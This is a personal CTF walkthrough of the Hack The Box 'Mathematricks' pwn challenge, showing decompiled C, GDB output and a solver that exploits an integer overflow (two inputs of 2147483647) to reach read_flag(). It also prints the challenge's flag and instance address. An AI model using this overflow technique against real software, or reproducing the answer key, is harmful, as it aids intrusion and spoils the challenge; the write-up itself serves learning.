# Mathematricks

## FLAG: HTB{m4th3m4tINT_5tuff_87f7e04f3fa023722d2f048558bde2e1}

## Status: Complete

+ DOCKER: Yes
+ DOWNLOADABLE: Yes

Description: How about a magic trick? Or a math trick? Beat me and I will give you an amazing reward!"

## NOTES

1. Deploy docker instance
   1. IP: 83.136.254.47
   2. PORT: 39650
2. Unzip challenge files
   1. > unzip pwn_mathematricks.zip
3. RUN
   1. Lets first run this to see what we are working with
      1. > nc 83.136.254.47 39650
         1. ~~ w3lC0m3 2 tH3 M4th3M4tR1kCs c0nt35t ~~
            1. Play
            2. Rules
         2. RULES: Solve the math questions to get the flag, some of them are tricky!
         3. PLAY:
            1. Q1: 1 + 1 = ?
               1. 2
            2. Q2: 2 - 1 = ?
               1. 1
            3. Q3: 1337 - 1337 = ?
               1. 0
            4. Q4: Enter 2 numbers n1, n2 where n1 > 0 and n2 > 0 and n1 + n2 < 0
               1. WRONG
4. GHIDRA
   1. Lets open this in ghidra and take a look
      1. GAME()

            ```c
                void game(void)

                {
                long lVar1;
                long lVar2;
                
                printstr(&DAT_00102180);
                printstr("\t\tQ1: 1 + 1 = ?\n\n\t\t> ");
                lVar1 = read_num();
                if (lVar1 != 2) {
                    printstr("\n\t\t[!] Elementary school opens at 07:00 AM, don\'t miss it!\n\n");
                                    /* WARNING: Subroutine does not return */
                    exit(0x520);
                }
                printf("\n\t\t%s[+] THAT WAS AMAZING!\n\n%s",&DAT_0010208a,&DAT_00102008);
                printstr("\t\tQ2: 2 - 1 = ?\n\n\t\t> ");
                lVar1 = read_num();
                if (lVar1 != 1) {
                    printstr("\n\t\t[!] Elementary school opens at 07:00 AM, don\'t miss it!\n\n");
                                    /* WARNING: Subroutine does not return */
                    exit(0x520);
                }
                printf("\n\t\t%s[+] WE HAVE A MATHEMATICIAN AMONG US!\n\n%s",&DAT_0010208a,&DAT_00102082);
                printstr("\t\tQ3: 1337 - 1337 = ?\n\n\t\t> ");
                lVar1 = read_num();
                if (lVar1 != 0) {
                    printstr("\n\t\t[!] High school opens at 07:00 AM, don\'t miss it!\n\n");
                                    /* WARNING: Subroutine does not return */
                    exit(0x520);
                }
                printf("\n\t\t%s[+] GOD OF MATHS JUST ENTERED THE CHAT..\n\n%s",&DAT_0010208a,&DAT_00102008);
                printstr("\t\tQ4: Enter 2 numbers n1, n2 where n1 > 0 and n2 > 0 and n1 + n2 < 0\n\n\t\tn1: ");
                lVar1 = read_num();
                printstr("\n\t\tn2: ");
                lVar2 = read_num();
                if ((0 < lVar1) && (0 < lVar2)) {
                    if ((int)lVar2 + (int)lVar1 < 0) {
                    read_flag();
                    }
                    else {
                    printstr("\n\t\t[!] Hacking school opens at 13:37 AM, don\'t miss it!\n\n");
                    }
                                    /* WARNING: Subroutine does not return */
                    exit(0x520);
                }
                printstr("\n\t\t[!] Hacking school opens at 13:37 AM, don\'t miss it!\n\n");
                                    /* WARNING: Subroutine does not return */
                exit(0x520);
                }
            ```

            1. In here we see the 4 main questions it asks
            2. We also see that if we successfully pass the correct number we get the read_flag() function called
5. TESTING
   1. So running the ./mathematricks locally we do some testing
   2. For the final question when they ask for n1 & n2 lets try inputting a ton of A's
      1. 30 A's -> program runs like normal
      2. 31 A's -> program immediately jumps to "Hacking schools opens at..."
6. GDB / GEF
   1. Opening the program in GDB
   2. Lets disassemble the GAME function
      1. gef> disas game
         1. And in here we see the memory address of read_flag()
            1. 0x00005555555558c3 <+452>:   call   0x555555555432 <read_flag>

## CHANGE OF THOUGHT

1. Soooo I don't see anywhere in the code that we can overflow - infact I think this is the wrong approach
2. HOWEVER!!!
   1. Trying to figure out which two numbers larger than 0 will sum to somthing negative - this isn't a matter of which two actual number do this, because there are not any natural numbers that do this
3. INT's
   1. Soooo we need to actually use a computer science concept
      1. Think Y2K clocks being set back to 0
      2. When the largest possible value for an int is gone over then it flips it to a negative int value
4. EXPLOIT
   1. So we need to use that largest possible int value which is: `2147483647`
   2. Now use this as n1 and n2
5. RUN (locally)
   1. > gdb ./mathematricks
      1. > 2
      2. > 1
      3. > 0
      4. > 2147483647
      5. > *Can be any number because when added it will "overflow" the int and turn it negative*
         1. HTB{f4k3_fl4g_f0r_t35t1ng}[Inferior 1 (process 228025) exited with code 040]
         2. SUCCESS! So our local example works time to try it on the server
6. RUN (server)
   1. > nc 83.136.254.47 39650
      1. Answer questions correctly
      2. n1 > 2147483647
      3. n2 > 2147483647
   2. FLAG: `HTB{m4th3m4tINT_5tuff_87f7e04f3fa023722d2f048558bde2e1}`

### PYTHON SOLVER

1. Just for testing purposes I want to edit the python solver they provide with the correct answers to see what happens
   1. PYTHON (LOCAL)
      1. Set LOCAL = True
      2. Set answers

            ```py
                sla('🥸 ', '1') # play game

                # Questions - You need to modify the "-1" value to the correct one
                sla('> ', '2')   # CHANGE THIS
                sla('> ', '1')   # CHANGE THIS
                sla('> ', '0')   # CHANGE THIS
                sla('n1: ', '2147483647' ) # CHANGE THIS
                sla('n2: ', '2147483647' ) # CHANGE THIS
            ```

            1. Now run this
      3. RUN
         1. > python3 ./solver.py
         2. TONS OF ERRORS!
            1. I will come back to this another time to debug